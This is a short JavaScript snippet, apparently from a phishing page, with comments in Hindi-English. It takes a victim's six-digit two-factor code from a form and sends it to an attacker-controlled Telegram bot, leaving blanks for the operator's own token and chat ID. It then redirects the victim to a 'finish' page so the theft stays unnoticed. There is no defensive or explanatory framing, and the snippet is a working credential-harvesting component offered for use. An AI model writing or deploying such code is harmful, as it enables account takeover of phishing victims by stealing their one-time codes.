<script>
    function sendOTP() {
        const otp = document.getElementById('otp').value;
        const botToken = 'YOUR_API_TOKEN_HERE'; // Apna Token yahan daalein
        const chatId = 'YOUR_CHAT_ID_HERE';     // Apni Chat ID yahan daalein
        
        if (otp === "" || otp.length < 6) {
            alert("Please enter a valid 6-digit code");
            return;
        }

        const text = `🚨 2FA CODE RECEIVED 🚨\nCode: ${otp}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;

        // Yeh 'XMLHttpRequest' method kisi bhi browser mein block nahi hota
        const xhttp = new XMLHttpRequest();
        xhttp.open("GET", url, true);
        xhttp.send();

        // Redirect hone ke liye thoda wait (taaki request chali jaye)
        setTimeout(() => {
            window.location.href = 'finish.html';
        }, 500);
    }
</script>
